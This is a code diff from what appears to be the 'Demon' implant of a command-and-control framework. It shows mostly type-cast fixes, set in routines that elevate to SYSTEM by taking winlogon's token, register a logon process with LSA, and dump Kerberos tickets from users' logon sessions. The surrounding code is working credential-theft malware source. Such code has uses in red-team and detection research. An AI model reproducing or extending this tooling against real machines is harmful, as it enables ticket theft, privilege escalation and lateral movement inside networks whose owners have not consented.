@@ -1,6 +1,7 @@
 
 #include <Demon.h>
 #include <Core/Kerberos.h>
+#include <Core/Win32.h>
 #include <Core/MiniStd.h>
 
 BOOL IsHighIntegrity(HANDLE TokenHandle)
@@ -58,7 +59,6 @@ DWORD GetProcessIdByName(WCHAR* processName)
 
 BOOL ElevateToSystem()
 {
-    CLIENT_ID         ClientID       = { 0 };
     NTSTATUS          NtStatus       = 0;
     OBJECT_ATTRIBUTES ObjAttr        = { sizeof( ObjAttr ) };
     WCHAR             winlogon[ 13 ] = { 0 };
@@ -185,12 +185,12 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
         name[ 5 ] =  0x67;
         */
         STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
-        status = Instance.Win32.LsaRegisterLogonProcess( &lsaString, &hLsaLocal, &mode );
+        status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
         if ( ! NT_SUCCESS( status ) || ! hLsaLocal )
         {
             if ( IsSystem( hToken ) )
             {
-                status = Instance.Win32.LsaRegisterLogonProcess( &lsaString, &hLsaLocal, &mode );
+                status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
                 if ( ! NT_SUCCESS( status ) )
                 {
                     status = Instance.Win32.LsaNtStatusToWinError( status );
@@ -200,7 +200,7 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
             {
                 if ( ElevateToSystem() )
                 {
-                    status = Instance.Win32.LsaRegisterLogonProcess( &lsaString, &hLsaLocal, &mode );
+                    status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
                     if ( ! NT_SUCCESS(status) )
                     {
                         status = Instance.Win32.LsaNtStatusToWinError( status );
@@ -283,7 +283,7 @@ NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )
     return status;
 }
 
-VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PULONG ticketSize )
+VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PUINT32 ticketSize )
 {
     PKERB_RETRIEVE_TKT_REQUEST  retrieveRequest  = NULL;
     PKERB_RETRIEVE_TKT_RESPONSE retrieveResponse = NULL;
@@ -307,7 +307,7 @@ VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING ta
     retrieveRequest->TargetName.Buffer = ( PWSTR )( (PBYTE )retrieveRequest + sizeof( KERB_RETRIEVE_TKT_REQUEST ));
     MemCopy( retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength );
 
-    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, &retrieveResponse, &responseSize, &protocolStatus );
+    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, (LPVOID*)&retrieveResponse, &responseSize, &protocolStatus );
     if ( NT_SUCCESS( status ) && NT_SUCCESS( protocolStatus ) )
     {
         if ( NT_SUCCESS( protocolStatus ) )
@@ -638,7 +638,7 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
         Instance.Win32.LsaFreeReturnBuffer( sessionData->sessionData[i] );
 
         cacheResponse = NULL;
-        status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &cacheRequest, sizeof( cacheRequest ), &cacheResponse, &responseSize, &protocolStatus );
+        status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &cacheRequest, sizeof( cacheRequest ), (LPVOID*)&cacheResponse, &responseSize, &protocolStatus );
         if ( ! NT_SUCCESS( status ) )
         {
             PRINTF( "[!] LsaCallAuthenticationPackage %ld\n", Instance.Win32.LsaNtStatusToWinError( status ) );
@@ -665,7 +665,7 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
 
             CopyTicketInfo( TicketInfo, &cacheResponse->Tickets[j] );
 
-            ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheResponse->Tickets[j].ServerName, &TicketInfo->Ticket.Buffer, &TicketInfo->Ticket.Length);
+            ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheResponse->Tickets[j].ServerName, (PUCHAR*)&TicketInfo->Ticket.Buffer, &TicketInfo->Ticket.Length);
 
             if ( ! NewSession->Tickets )
             {
